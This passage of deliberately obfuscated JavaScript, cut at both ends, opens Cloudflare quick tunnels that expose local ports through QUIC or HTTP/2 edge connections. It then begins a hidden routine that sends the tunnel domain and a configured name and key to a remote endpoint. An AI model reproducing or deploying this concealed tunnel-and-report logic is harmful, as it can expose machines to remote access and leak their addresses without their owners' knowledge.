        d[jo(0x77f)](a[jo(0x43f)](a['tASxm'], b[jo(0xab4)])), !h && this[jo(0x1df)][jo(0xab4)] && d[jo(0x77f)](a[jo(0xa20)](jo(0x54c), this[jo(0x1df)]['host'])), !f && d[jo(0x77f)](a['RBsQC'] + a0k[jo(0x863)](0x10)[jo(0x1d9)](jo(0xd18))), !g && d['push'](jo(0x6bd)), d[jo(0x77f)](a[jo(0x4a4)]), d[jo(0x77f)](a[jo(0x4ae)]), this[jo(0xba5)][jo(0x92a)](Buffer['from'](a[jo(0xa66)](d[jo(0xaa7)]('\x0d\x0a'), a[jo(0x9a9)]), a['RJTny']));
    }
}
class a0bW {
    constructor(a, b, c, d, f, g, h) {
        const jp = a0ch, i = { 'VtuDL': jp(0x494) }, j = i[jp(0xad6)][jp(0xbb0)]('|');
        let k = 0x0;
        while (!![]) {
            switch (j[k++]) {
            case '0':
                this[jp(0x25f)] = new Map();
                continue;
            case '1':
                this['log'] = h;
                continue;
            case '2':
                this[jp(0x942)] = f;
                continue;
            case '3':
                this[jp(0x2e2)] = c;
                continue;
            case '4':
                this[jp(0xb1c)][jp(0x6fe)] = l => this[jp(0xb00)](l);
                continue;
            case '5':
                this[jp(0x8b3)] = d;
                continue;
            case '6':
                this['settle'] = null;
                continue;
            case '7':
                this['connIndex'] = g;
                continue;
            case '8':
                this['conn'] = a;
                continue;
            case '9':
                this[jp(0x6af)] = new Promise((l, m) => {
                    const jq = jp;
                    this[jq(0x2d7)] = {
                        'resolve': l,
                        'reject': m
                    };
                });
                continue;
            case '10':
                this[jp(0xb1c)]['onStreamEnd'] = l => this[jp(0x68e)](l);
                continue;
            case '11':
                this[jp(0x1a3)] = new Set();
                continue;
            case '12':
                this[jp(0x727)] = ![];
                continue;
            case '13':
                this['conn'][jp(0x7c5)] = l => this['acceptStream'](l);
                continue;
            case '14':
                this[jp(0x355)] = null;
                continue;
            case '15':
                this['origin'] = b;
                continue;
            case '16':
                this['conn']['onStreamData'] = (l, m) => this[jp(0x94a)](l, m);
                continue;
            }
            break;
        }
    }
    [a0ch(0x668)]() {
        const jr = a0ch, a = this['conn']['openStream']();
        return this[jr(0x355)] = new a0aV(this[jr(0xb1c)], a['id'], this[jr(0x215)], { 'quic': !![] }), this[jr(0x355)]['start'](this[jr(0x2e2)], this[jr(0x8b3)], this[jr(0x942)], this[jr(0x6c8)]), this[jr(0x6af)];
    }
    [a0ch(0xb00)](a) {
        const js = a0ch;
        if (this[js(0x727)])
            return;
        this[js(0x727)] = !![], this['requests']['clear']();
        for (const b of this[js(0x1a3)]) {
            b[js(0xb00)]();
        }
        this['relays']['clear'](), a ? this[js(0x2d7)][js(0x1e0)](a) : this[js(0x2d7)]['resolve']();
    }
    [a0ch(0xb1d)](a) {
        const jt = a0ch, b = {
                'PPHyM': function (c, d) {
                    return c !== d;
                },
                'eyYLS': function (c, d) {
                    return c & d;
                }
            };
        if (b[jt(0x81f)](b['eyYLS'](a['id'], 0x3), 0x1))
            return;
        this['requests'][jt(0xb80)](a['id'], {
            'stream': a,
            'buffer': Buffer[jt(0x9e7)](0x0),
            'body': Buffer[jt(0x9e7)](0x0),
            'request': null,
            'websocket': ![],
            'relay': null,
            'ended': ![],
            'served': ![],
            'failed': ![]
        });
    }
    [a0ch(0x94a)](a, b) {
        const ju = a0ch, c = {
                'IQLxq': function (f, g) {
                    return f !== g;
                },
                'PmIZi': function (f, g) {
                    return f === g;
                }
            };
        if (c[ju(0x4da)](this['control'], null) && c[ju(0x3cc)](a['id'], this[ju(0x355)][ju(0x73e)])) {
            this[ju(0x355)][ju(0xae2)](b);
            return;
        }
        const d = this[ju(0x25f)]['get'](a['id']);
        if (d === undefined || d[ju(0x128)])
            return;
        if (c['PmIZi'](d[ju(0x1df)], null))
            d[ju(0xc5e)] = Buffer[ju(0x653)]([
                d[ju(0xc5e)],
                b
            ]), this[ju(0xb82)](d);
        else
            b[ju(0xed)] && (d[ju(0xcfe)] && d[ju(0x296)] !== null ? d[ju(0x296)]['feed'](b) : d[ju(0xae4)] = Buffer[ju(0x653)]([
                d[ju(0xae4)],
                b
            ]));
        this[ju(0x74f)](d);
    }
    [a0ch(0x68e)](a) {
        const jv = a0ch, b = {
                'tNjTP': function (d, f) {
                    return d !== f;
                },
                'NlUBx': function (d, f) {
                    return d === f;
                },
                'GOKXS': function (d, f) {
                    return d !== f;
                }
            };
        if (b[jv(0x9a4)](this[jv(0x355)], null) && b[jv(0x819)](a['id'], this[jv(0x355)]['streamId'])) {
            this[jv(0x355)]['finished'] = !![];
            return;
        }
        const c = this['requests'][jv(0x850)](a['id']);
        if (b['NlUBx'](c, undefined))
            return;
        c[jv(0x84e)] = !![];
        if (c[jv(0xcfe)] && c['relay'] !== null) {
            c[jv(0x296)][jv(0xae2)](null);
            return;
        }
        b[jv(0x336)](c[jv(0x1df)], null) ? this[jv(0x74f)](c) : this['requests'][jv(0xaa3)](a['id']);
    }
    [a0ch(0xb82)](a) {
        const jw = a0ch, b = {
                'UHQhE': function (h, i) {
                    return h < i;
                },
                'pOrZT': jw(0xc52),
                'fFzWq': function (h, i) {
                    return h + i;
                },
                'ASLse': function (h, i) {
                    return h + i;
                },
                'YZZue': function (h, i) {
                    return h + i;
                },
                'mFChq': jw(0xa79),
                'AhrgL': function (h, i, j) {
                    return h(i, j);
                },
                'ZNULe': function (h, i) {
                    return h(i);
                },
                'eSGDW': function (h, i) {
                    return h + i;
                },
                'dJJwN': 'stream\x20',
                'cptVb': jw(0x777),
                'aoywa': function (h, i) {
                    return h(i);
                },
                'mOdjT': function (h, i) {
                    return h + i;
                },
                'HPSXP': function (h, i) {
                    return h + i;
                },
                'HEQdo': function (h, i) {
                    return h + i;
                },
                'gKpZa': function (h, i) {
                    return h(i);
                }
            }, c = a[jw(0xc5e)];
        if (b[jw(0x20f)](c[jw(0xed)], a0b4['length']))
            return;
        if (!c['subarray'](0x0, a0b2['length'])[jw(0x45b)](a0b2)) {
            this[jw(0x215)]['warning'](jw(0x10b) + a[jw(0x359)]['id'] + '\x20is\x20not\x20a\x20v1\x20tunnel\x20data\x20stream'), a[jw(0x128)] = !![];
            return;
        }
        if (c['subarray'](0x6, 0x8)['toString'](b[jw(0x33f)]) !== '01') {
            this[jw(0x215)][jw(0x8dd)](b[jw(0xa29)](b[jw(0x55d)](b['YZZue'](jw(0x10b), a[jw(0x359)]['id']), b[jw(0x3f1)]), c[jw(0x4b4)](0x6, 0x8)[jw(0x1d9)](b['pOrZT']))), a[jw(0x128)] = !![];
            return;
        }
        const [d, f] = b[jw(0x7a2)](a0aE, c[jw(0x4b4)](a0b4['length']), 0x1);
        if (!d['length'])
            return;
        let g;
        try {
            g = b[jw(0x5f6)](a0aK, d[0x0]);
        } catch (h) {
            this['log'][jw(0x8dd)](b[jw(0x55d)](b[jw(0x600)](b[jw(0x1c5)], a['stream']['id']), b[jw(0xcf4)]) + h), a['failed'] = !![];
            return;
        }
        a[jw(0xae4)] = f, a['buffer'] = Buffer[jw(0x9e7)](0x0);
        try {
            a[jw(0x1df)] = b[jw(0x879)](a0bT, g), a[jw(0x1df)]['type'] === a0b6[jw(0xcfe)] && (a['websocket'] = !![]);
        } catch (i) {
            this[jw(0x215)][jw(0x8dd)](b[jw(0x622)](b['HPSXP'](b[jw(0x881)]('stream\x20', a['stream']['id']), ':\x20'), i)), a[jw(0x128)] = !![], this['respond'](a, b[jw(0x720)](String, i[jw(0x8f9)] || i), 0x1f6);
        }
    }
    ['maybeServe'](a) {
        const jx = a0ch, b = {
                'szqLA': function (c, d) {
                    return c === d;
                },
                'qdbSJ': function (c, d) {
                    return c(d);
                }
            };
        if (a[jx(0x62c)] || b[jx(0xcd8)](a[jx(0x1df)], null) || a[jx(0x128)] || !b['qdbSJ'](a0bU, a))
            return;
        a[jx(0x62c)] = !![], this[jx(0x55f)](a);
    }
    async ['serveRequest'](a) {
        const jy = a0ch, b = {
                'HncMh': function (f, g) {
                    return f === g;
                },
                'BtvXX': function (f, g) {
                    return f !== g;
                },
                'QdzYH': function (f, g) {
                    return f + g;
                },
                'SVpFk': jy(0x8be),
                'YhBFw': function (f, g) {
                    return f === g;
                },
                'yAPee': jy(0x890),
                'jdiFT': function (f, g) {
                    return f + g;
                },
                'TYlan': function (f, g) {
                    return f(g);
                },
                'QCcbC': function (f, g) {
                    return f + g;
                },
                'ixDzP': function (f, g) {
                    return f + g;
                },
                'GofYg': jy(0x10b),
                'vCFPi': '\x20proxy\x20failed:\x20'
            }, c = a[jy(0x359)], d = a[jy(0x1df)];
        try {
            if (b[jy(0xc8e)](d[jy(0x430)], a0b6[jy(0xcfe)])) {
                this['serveWebsocket'](a);
                return;
            }
            if (b['BtvXX'](d['type'], a0b6[jy(0xc50)]))
                throw new Error(b[jy(0x6b8)](jy(0xb93), d[jy(0x430)]) + b[jy(0x5dc)]);
            const f = await a0aY(this[jy(0x85a)], d[jy(0x5bd)], d[jy(0x4ac)], d[jy(0x363)], a['body']), g = [[
                        a0b9,
                        String(b[jy(0xc8e)](f[jy(0x4dc)], 0x65) ? 0xc8 : f[jy(0x4dc)])
                    ]];
            let h = ![];
            for (const [i, j] of f[jy(0x363)]) {
                const k = i[jy(0xacd)]();
                if (b['YhBFw'](k, jy(0x91c)))
                    continue;
                k === b[jy(0x14f)] && (h = !![]), g[jy(0x77f)]([
                    b['QdzYH'](b['jdiFT'](a0ba, ':'), i),
                    j
                ]);
            }
            if (!h) {
                const l = b[jy(0x7fb)](a0aN, d['path']);
                l && g[jy(0x77f)]([
                    b['jdiFT'](a0ba, jy(0xaab)),
                    l
                ]);
            }
            this['writeResponse'](c, '', g, ![]);
            for await (const m of f[jy(0xae4)]) {
                c[jy(0x92a)](m, ![]);
            }
            c[jy(0x92a)](Buffer[jy(0x9e7)](0x0), !![]);
        } catch (n) {
            this['log'][jy(0x8dd)](b[jy(0x1e5)](b[jy(0x2de)](b['ixDzP'](b['GofYg'], c['id']), b['vCFPi']), n)), this[jy(0x8ef)](a, b['TYlan'](String, n[jy(0x8f9)] || n), 0x1f6);
        } finally {
            !a[jy(0xcfe)] && this[jy(0x25f)]['delete'](c['id']);
        }
    }
    [a0ch(0x855)](a) {
        const jz = a0ch, b = new a0bV(this, a, a['request'], this[jz(0x85a)], this[jz(0x215)]);
        a['relay'] = b, this['relays']['add'](b), a[jz(0xae4)][jz(0xed)] && (b['feed'](a[jz(0xae4)]), a[jz(0xae4)] = Buffer[jz(0x9e7)](0x0)), b['run']()['catch'](() => {
        })['finally'](() => {
            const jA = jz;
            this[jA(0x1a3)][jA(0xaa3)](b), this[jA(0x25f)][jA(0xaa3)](a[jA(0x359)]['id']);
        });
    }
    [a0ch(0x8ef)](a, b, c) {
        const jB = a0ch, d = {
                'gMSns': function (f, g) {
                    return f(g);
                }
            };
        this[jB(0x41a)](a['stream'], b, [[
                a0b9,
                d[jB(0x453)](String, c)
            ]], !![]);
    }
    [a0ch(0x41a)](a, b, c, d) {
        const jC = a0ch, f = {
                'RwGjp': function (g, h, i) {
                    return g(h, i);
                }
            };
        if (this['stopped'] || a[jC(0x6da)][jC(0x1d6)])
            return;
        a['write'](Buffer[jC(0x653)]([
            a0b4,
            f[jC(0x6a0)](a0aL, b, c)
        ]), d);
    }
}
async function a0bX(a, b, c) {
    const jD = a0ch, d = {
            'RViTM': function (h, i) {
                return h === i;
            },
            'tRkZc': function (h, i) {
                return h === i;
            },
            'JQNGI': function (h, i) {
                return h + i;
            },
            'kZbPb': function (h, i) {
                return h + i;
            },
            'euUNh': function (h, i) {
                return h + i;
            },
            'sJsHs': jD(0x8c1),
            'PHYvV': '\x20over\x20QUIC',
            'dTRnu': 'edge\x20',
            'Mqhyl': jD(0x570),
            'EwvEI': 'edge\x20connect\x20failed',
            'SFqaa': jD(0x2bf)
        }, f = a0ak[jD(0x88a)]()[jD(0x9bd)](() => Math[jD(0x486)]() - 0.5);
    let g = null;
    for (const h of f) {
        const i = new a0bR({
            'logger': a,
            'host': h,
            'port': a0al,
            'serverName': a0bd,
            'alpn': a0bc,
            'idleTimeout': d[jD(0x555)](b, undefined) ? 0x7530 : b,
            'verifyCertificate': d[jD(0x151)](c, !![])
        });
        try {
            return await i[jD(0x368)](), a['info'](d['JQNGI'](d[jD(0x874)](d['euUNh'](d[jD(0x874)](d[jD(0x75e)], h), ':'), a0al), d[jD(0xb18)])), i;
        } catch (j) {
            g = j, a['warning'](d['euUNh'](d[jD(0xd6c)] + h + d[jD(0x277)], j[jD(0x8f9)]));
            try {
                i[jD(0x4f7)](d['EwvEI']);
            } catch (k) {
            }
        }
    }
    throw new Error(d[jD(0x224)] + g);
}
const a0bY = 0x2;
function a0bZ(a, b, c) {
    const jE = a0ch, d = {
            'uaMsX': function (g, h, i) {
                return g(h, i);
            },
            'fKRTV': function (g, h) {
                return g < h;
            }
        }, f = d[jE(0x45c)](parseInt, process.env[a] || '', 0xa);
    if (!Number[jE(0xa7a)](f) || d[jE(0xb88)](f, c))
        return b;
    return f;
}
const a0c0 = a0bZ(a0ch(0xb60), 0x5, 0x2), a0c1 = 0x1e, a0c2 = ((() => {
        const jF = a0ch, a = {
                'QxDWi': function (c, d) {
                    return c < d;
                },
                'wwRuy': function (c, d) {
                    return c * d;
                },
                'tKsQs': function (c, d) {
                    return c === d;
                },
                'qkuKI': function (c, d) {
                    return c * d;
                }
            }, b = parseInt(process.env.KISAMA_ARGO_IDLE_TIMEOUT || '', 0xa);
        if (!Number[jF(0xa7a)](b) || a[jF(0x8d8)](b, 0x0))
            return a[jF(0xa62)](0x12c, 0x3e8);
        return a[jF(0x3f8)](b, 0x0) ? 0x0 : a[jF(0x8c0)](Math['max'](b, 0xa), 0x3e8);
    })());
function a0c3(a) {
    const jG = a0ch, b = {
            'rzIjM': jG(0x9be),
            'oGGkh': 'object'
        };
    if (typeof a === b[jG(0x6e9)]) {
        const c = a[jG(0x40e)]();
        if (c)
            try {
                return JSON['parse'](c);
            } catch (d) {
            }
        return {};
    }
    return a && typeof a === b['oGGkh'] ? a : {};
}
class a0c4 {
    constructor(a) {
        const jH = a0ch;
        this[jH(0x215)] = a, this[jH(0x587)] = new Map(), this[jH(0x82f)] = null;
    }
    async [a0ch(0xc6c)](a, b, c = ![]) {
        const jI = a0ch, d = {
                'xIyWq': function (m, n) {
                    return m > n;
                },
                'kXJaC': function (m, n) {
                    return m(n);
                },
                'LcRul': 'https://api.trycloudflare.com',
                'WFwzm': function (m, n) {
                    return m + n;
                },
                'WFLAY': 'failed\x20to\x20create\x20tunnel:\x20',
                'Txdoz': jI(0x8e9),
                'rsfag': jI(0x7c7),
                'EEMob': function (m, n) {
                    return m + n;
                },
                'CEuvL': function (m, n) {
                    return m + n;
                },
                'LZYZZ': function (m, n) {
                    return m + n;
                },
                'lQyYe': function (m, n) {
                    return m + n;
                },
                'ZhmIC': 'argo\x20tunnel\x20created:\x20',
                'IAsMh': jI(0xaff)
            }, f = this[jI(0x587)][jI(0x850)](a) || [];
        if (d[jI(0x100)](f[jI(0xed)], 0x0) && !b) {
            const m = new Error(jI(0x9c4) + a + ',\x20set\x20duplicate=true\x20to\x20force\x20creation');
            m[jI(0x4dc)] = 0x199, m[jI(0xae3)] = a;
            throw m;
        }
        let g, h, i, j;
        try {
            [g, h, i, j] = await d[jI(0xc67)](a0aQ, d[jI(0x754)]);
        } catch (n) {
            const o = new Error(d[jI(0x7a7)](d['WFLAY'], n[jI(0x8f9)]));
            o['status'] = 0x1f4, o[jI(0xae3)] = a;
            throw o;
        }
        const k = g['startsWith'](d[jI(0x984)]) ? g : d[jI(0x7a7)](d['Txdoz'], g), l = {
                'tunnelDomain': k,
                'port': a,
                'createdAt': new Date()[jI(0x774)]()['replace'](/\.\d{3}Z$/, 'Z'),
                'transport': c ? d[jI(0xb5e)] : 'h2',
                'quicFailures': 0x0,
                'stopped': ![],
                'sock': null,
                'conn': null,
                'runPromise': null
            };
        return l[jI(0x510)] = this[jI(0x9aa)](l, h, i, j)[jI(0x818)](p => this['log'][jI(0x8dd)](jI(0xcd6) + k + jI(0xa2c) + p[jI(0x8f9)])), f['push'](l), this['tunnels'][jI(0xb80)](a, f), this[jI(0x215)][jI(0x1b1)](d[jI(0x7a7)](d[jI(0x93f)](d[jI(0x9fc)](d[jI(0xcf8)](d[jI(0x69c)](d[jI(0x7a7)](d['ZhmIC'], k), d[jI(0x50a)]), a), '\x20('), l[jI(0xbaa)]), ')')), l;
    }
    [a0ch(0xaa0)]() {
        const jJ = a0ch, a = [], b = [...this['tunnels'][jJ(0x2a2)]()][jJ(0x9bd)]((c, d) => c - d);
        for (const c of b) {
            for (const d of this[jJ(0x587)]['get'](c)) {
                a[jJ(0x77f)]({
                    'tunnel_domain': d[jJ(0xa13)],
                    'port': d['port'],
                    'created_at': d['createdAt'],
                    'transport': d['transport']
                });
            }
        }
        return a;
    }
    async [a0ch(0x522)](a, b) {
        const jK = a0ch, c = {
                'hdwfG': function (i, j) {
                    return i === j;
                },
                'eHMrV': function (i, j) {
                    return i === j;
                },
                'sYPFQ': function (i, j) {
                    return i === j;
                },
                'tyZMd': jK(0x1c9),
                'cWZMU': function (i, j) {
                    return i !== j;
                },
                'heHsZ': jK(0xa5e),
                'zOIvq': function (i, j) {
                    return i > j;
                },
                'eahar': function (i, j) {
                    return i + j;
                }
            }, d = this[jK(0x587)][jK(0x850)](a) || [];
        if (c[jK(0x823)](d[jK(0xed)], 0x0))
            return {
                'status': 0x194,
                'message': 'no\x20tunnel\x20found\x20on\x20port\x20' + a
            };
        let f;
        if (c[jK(0xf1)](b, undefined) || c[jK(0x2b6)](b, null) || b === '') {
            if (d[jK(0xed)] > 0x1)
                return {
                    'status': 0x199,
                    'message': jK(0x137) + a + jK(0xac6)
                };
            f = d;
        } else {
            f = d[jK(0x29a)](i => i[jK(0xa13)] === b);
            if (c[jK(0x2b6)](f[jK(0xed)], 0x0))
                return {
                    'status': 0x194,
                    'message': jK(0x771) + a + '\x20with\x20domain\x20' + b
                };
        }
        const g = [];
        for (const i of f) {
            const j = c[jK(0x841)][jK(0xbb0)]('|');
            let k = 0x0;
            while (!![]) {
                switch (j[k++]) {
                case '0':
                    g[jK(0x77f)]({
                        'tunnel_domain': i[jK(0xa13)],
                        'port': i[jK(0xae3)],
                        'created_at': i[jK(0x33a)],
                        'transport': i[jK(0xbaa)]
                    });
                    continue;
                case '1':
                    if (c[jK(0x444)](i[jK(0xba5)], null))
                        try {
                            i[jK(0xba5)]['destroy']();
                        } catch (l) {
                        }
                    continue;
                case '2':
                    i[jK(0x727)] = !![];
                    continue;
                case '3':
                    await i['runPromise']['catch'](() => {
                    });
                    continue;
                case '4':
                    if (c[jK(0x444)](i[jK(0xb1c)], null))
                        try {
                            i[jK(0xb1c)][jK(0x4f7)](c['heHsZ']);
                        } catch (m) {
                        }
                    continue;
                }
                break;
            }
        }
        const h = d[jK(0x29a)](n => !n[jK(0x727)]);
        c[jK(0x301)](h['length'], 0x0) ? this[jK(0x587)][jK(0xb80)](a, h) : this['tunnels'][jK(0xaa3)](a);
        for (const n of g) {
            this[jK(0x215)]['info'](c[jK(0xcee)](jK(0x7b5), n['tunnel_domain']));
        }
        return {
            'status': 'ok',
            'deleted': g[jK(0xed)],
            'tunnels': g
        };
    }
    async ['_runLoop'](a, b, c, d) {
        const jL = a0ch, f = {
                'KRcdu': function (k, l) {
                    return k < l;
                },
                'NojiL': jL(0xa1c),
                'FJxui': function (k, l) {
                    return k !== l;
                },
                'DXNbs': function (k, l) {
                    return k(l);
                },
                'HkMVS': 'true',
                'iPJfK': function (k, l) {
                    return k === l;
                },
                'hyHXm': jL(0x7c7),
                'flaVI': function (k, l, m, n) {
                    return k(l, m, n);
                },
                'CcDMr': function (k, l) {
                    return k > l;
                },
                'RjETO': jL(0xa5e),
                'pBYCp': function (k, l) {
                    return k % l;
                },
                'OvPvU': function (k, l) {
                    return k + l;
                },
                'xajdD': function (k, l, m) {
                    return k(l, m);
                },
                'yQxjE': function (k, l) {
                    return k + l;
                },
                'qBfDb': function (k, l) {
                    return k + l;
                },
                'uolKe': function (k, l) {
                    return k + l;
                },
                'HCIqt': jL(0x78c),
                'oziXB': jL(0x107),
                'YzlOt': function (k, l) {
                    return k === l;
                },
                'lMDto': function (k, l) {
                    return k >= l;
                },
                'bBTrp': function (k, l) {
                    return k * l;
                },
                'zyXXS': function (k, l) {
                    return k(l);
                }
            }, g = f['NojiL'] + a['port'], h = async k => {
                const jM = jL;
                for (let l = 0x0; f[jM(0x2c7)](l, k) && !a[jM(0x727)]; l += 0x1f4) {
                    await new Promise(m => setTimeout(m, Math[jM(0x2dc)](0x1f4, k - l)));
                }
            };
        let i = 0x0, j = 0x0;
        while (!a[jL(0x727)]) {
            let k = null, l = null, m = null;
            try {
                const o = f[jL(0x703)](f['DXNbs'](String, process.env.KISAMA_EDGE_INSECURE || '')[jL(0xacd)](), f['HkMVS']);
                if (f[jL(0x47d)](a[jL(0xbaa)], f[jL(0xd22)])) {
                    m = await f[jL(0x3ab)](a0bX, this['log'], f['CcDMr'](a0c2, 0x0) ? a0c2 : 0x7530, o);
                    if (a[jL(0x727)]) {
                        try {
                            m[jL(0x4f7)](f[jL(0x43d)]);
                        } catch (p) {
                        }
                        break;
                    }
                    a['conn'] = m, j = f[jL(0x6e2)](f[jL(0x19e)](j, 0x1), 0x4), await new a0bW(m, g, b, c, d, j, this[jL(0x215)])[jL(0x668)]();
                } else {
                    k = await f[jL(0x238)](a0b1, o, this[jL(0x215)]);
                    if (a[jL(0x727)]) {
                        try {
                            k['destroy']();
                        } catch (q) {
                        }
                        break;
                    }
                    a['sock'] = k, j = f[jL(0x6e2)](j + 0x1, 0x4), l = new a0aT(k, g, b, c, d, j, this['log'], a['tunnelDomain'], ![], { 'printed': !![] }), await l['run']();
                }
            } catch (r) {
                !a[jL(0x727)] && this[jL(0x215)][jL(0x8dd)](f[jL(0x72f)](f['qBfDb'](f[jL(0xd3d)](jL(0xaed), a[jL(0xa13)]), f[jL(0x14b)]), r[jL(0x8f9)]));
            } finally {
                if (f[jL(0x703)](k, null))
                    try {
                        k[jL(0x3d8)]();
                    } catch (s) {
                    }
                if (f['FJxui'](m, null))
                    try {
                        m[jL(0x4f7)](f[jL(0xc7a)]);
                    } catch (t) {
                    }
                a[jL(0xba5)] = null, a[jL(0xb1c)] = null;
            }
            if (a[jL(0x727)])
                break;
            const n = f[jL(0x703)](l, null) && l[jL(0x103)] || m !== null && m['registered'];
            n ? (i = 0x0, a['quicFailures'] = 0x0) : (i += 0x1, f[jL(0x467)](a['transport'], f['hyHXm']) && (a[jL(0x10a)] += 0x1, f['lMDto'](a['quicFailures'], a0c0) && (a[jL(0xbaa)] = 'h2', this[jL(0x215)][jL(0x8dd)](jL(0xaed) + a[jL(0xa13)] + jL(0xd00) + a[jL(0x10a)] + jL(0xfc)), a[jL(0x10a)] = 0x0)), f[jL(0x445)](i, a0c0) && (await this[jL(0x39c)](a, (u, v, w) => {
                b = u, c = v, d = w;
            }) ? (i = 0x0, a[jL(0x10a)] = 0x0) : await f[jL(0x76d)](h, f['bBTrp'](a0c1, 0x3e8)))), !a['stopped'] && await f[jL(0xcc2)](h, f['bBTrp'](a0bY, 0x3e8));
        }
    }
    [a0ch(0x39c)](a, b) {
        const jN = a0ch, c = {
                'ibhbJ': jN(0x8e9),
                'DEKIs': function (f, g) {
                    return f + g;
                },
                'tXZTX': function (f, g) {
                    return f + g;
                },
                'ZSLSY': jN(0x5e5),
                'WICvD': jN(0x908),
                'Kssqw': function (f, g) {
                    return f === g;
                },
                'FTzkg': jN(0x18f),
                'PRaGp': function (f, g) {
                    return f(g);
                },
                'nwMOp': 'https://api.trycloudflare.com'
            }, d = this[jN(0x506)] || a0aQ;
        return c[jN(0x4ea)](d, c[jN(0xca9)])['then'](([f, g, h, i]) => {
            const jO = jN, j = a[jO(0xa13)];
            b(g, h, i), a[jO(0xa13)] = f['startsWith'](c[jO(0x197)]) ? f : c[jO(0xcb5)](c[jO(0x197)], f), this[jO(0x215)][jO(0x8dd)](c['tXZTX'](c[jO(0x3cb)](c['ZSLSY'], j) + c[jO(0x118)], a[jO(0xa13)]));
            if (c[jO(0x2d6)](typeof this['onDomainChange'], jO(0x686)))
                try {
                    this[jO(0x82f)](j, a[jO(0xa13)]);
                } catch (k) {
                }
            return !![];
        })[jN(0x818)](f => {
            const jP = jN;
            return this[jP(0x215)]['warning'](c['FTzkg'] + f[jP(0x8f9)]), ![];
        });
    }
}
class a0c5 {
    static [a0ch(0x634)] = ![];
    static [a0ch(0x21e)] = null;
    static [a0ch(0x24f)] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static [a0ch(0x862)] = ![];
    static [a0ch(0xb84)]() {
        const jQ = a0ch, a = {
                'Hbeqk': function (g, h) {
                    return g < h;
                },
                'oGAuf': jQ(0x99f),
                'jQFtl': function (g, h) {
                    return g < h;
                },
                'RRwYg': jQ(0x6db),
                'UUTBO': 'KNAME',
                'OTQQV': function (g, h) {
                    return g === h;
                },
                'rhJfm': function (g, h) {
                    return g + h;
                },
                'oDgdu': function (g, h) {
                    return g || h;
                },
                'DVlxT': jQ(0xfb),
                'Qrnmt': jQ(0xd43)
            }, b = a0a1['KNAME'] || '', c = a0a1['KNAME_KEY'] || a0a1['KNAME'] || '', d = [];
        if (a[jQ(0x333)](b[jQ(0xed)], 0x3))
            d[jQ(0x77f)](jQ(0x514) + b[jQ(0xed)] + jQ(0x36f));
        if (!this[jQ(0x24f)]['test'](b))
            d[jQ(0x77f)](a[jQ(0x1b4)]);
        if (a[jQ(0xbec)](c['length'], 0x8))
            d[jQ(0x77f)](jQ(0xbd9) + c[jQ(0xed)] + '<8,\x20实际使用\x20' + (a0a1[jQ(0x6db)] ? a[jQ(0xc35)] : a[jQ(0x6d8)]) + ')');
        const f = a[jQ(0x2df)](d[jQ(0xed)], 0x0);
        return !f && !this[jQ(0x862)] && (this['_SHZAL_KEY_HINT_SHOWN'] = !![], a0P['info'](a['rhJfm'](jQ(0x7bd) + d[jQ(0xaa7)](';\x20') + '\x20', jQ(0x793) + a[jQ(0x609)](b, jQ(0xd1b)) + jQ(0x79a) + (a0a1['KNAME_KEY'] ? jQ(0x21a) + a0a1[jQ(0x6db)][jQ(0xed)] + ')' : a[jQ(0x38c)]) + ')')), a0P[jQ(0x1b1)](a['Qrnmt'])), f;
    }
    static [a0ch(0x869)]() {
        const jR = a0ch, a = {
                'ixDbk': function (b, c) {
                    return b === c;
                },
                'QHPqM': function (b, c) {
                    return b(c);
                },
                'qHCGw': jR(0x464)
            };
        return a0a1['DEBUG'] || a[jR(0xb59)](a[jR(0x438)](String, process.env.SHZAL_DEBUG || '')[jR(0xacd)](), a[jR(0x28c)]);
    }
    static [a0ch(0x954)](a) {
        const jS = a0ch, b = {
                'YkhQO': jS(0x85b),
                'MafoE': jS(0xa40),
                'Mhxwv': function (f, g) {
                    return f + g;
                },
                'EiAQU': jS(0x392),
                'XkLfK': function (f, g) {
                    return f + g;
                },
                'lUrUu': jS(0xd21),
                'MiuOW': jS(0xb4f),
                'ijINC': function (f, g) {
                    return f(g);
                },
                'fJNvp': jS(0x6e6),
                'yAVlc': function (f, g) {
                    return f === g;
                },
                'NpnJy': function (f, g) {
                    return f(g);
                },
                'qPPUF': jS(0x6b2),
                'XGyTX': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'Izowo': function (f, g) {
                    return f(g);
                },
                'nNGaU': '上报成功',
                'wXBNl': function (f, g) {
                    return f(g);
                },
                'IfHgy': jS(0x887),
                'gUWyC': jS(0x2f7),
                'WSHGQ': jS(0x323),
                'WEEpD': jS(0x66a),
                'RgVga': function (f, g) {
                    return f + g;
                },
                'GLlEK': function (f, g) {
                    return f + g;
                },
                'DbztH': '开始上报域名\x20->\x20',
                'UcMwO': function (f, g) {
                    return f > g;
                },
                'lvtms': function (f, g, h, i, j) {
                    return f(g, h, i, j);
                },
                'hevze': jS(0x246),
                'HYMBt': function (f, g) {
                    return f(g);
                },
                'bxSvn': jS(0xb76),
                'lxtUR': jS(0x1dc),
                'LMggW': function (f, g) {
                    return f(g);
                }
            }, c = this['reportShzalDebug'](), d = f => {
                const jT = jS;
                if (c)
                    a0P[jT(0x4f6)](b[jT(0x6e5)] + f);
            };
        return new Promise(f => {
            const jV = jS, g = {
                    'gaweS': function (n, o) {
                        const jU = a0b;
                        return b[jU(0x2fb)](n, o);
                    },
                    'GBTKi': function (n, o) {
                        return b['Mhxwv'](n, o);
                    },
                    'PCpjj': b[jV(0x8f0)],
                    'gbxLc': b[jV(0x67a)],
                    'qxciH': function (n, o) {
                        const jW = jV;
                        return b[jW(0x5d2)](n, o);
                    }
                }, h = a0a1[jV(0x446)], i = a0a1[jV(0x6db)] || a0a1[jV(0x446)], j = b[jV(0xb97)](b[jV(0x4d9)], a0k[jV(0x863)](0xc)[jV(0x1d9)]('hex')), k = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        h
                    ],
                    [
                        's',
                        i
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], l = n => {
                    const jX = jV, o = n['map'](([p, q]) => Buffer[jX(0x8c2)]('--' + j + jX(0xa92) + p + jX(0x243) + q + '\x0d\x0a'));
                    return o[jX(0x77f)](Buffer[jX(0x8c2)]('--' + j + jX(0x163))), Buffer[jX(0x653)](o);
                }, m = (n, o, p, q) => {
                    const jY = jV, r = {
                            'CVIRt': b[jY(0x48a)],
                            'BcJlJ': function (v, w) {
                                return v + w;
                            },
                            'APgjQ': function (v, w) {
                                const jZ = jY;
                                return b[jZ(0xc17)](v, w);
                            },
                            'dzilY': b['EiAQU']
                        }, s = new URL(n), t = a0h['request']({
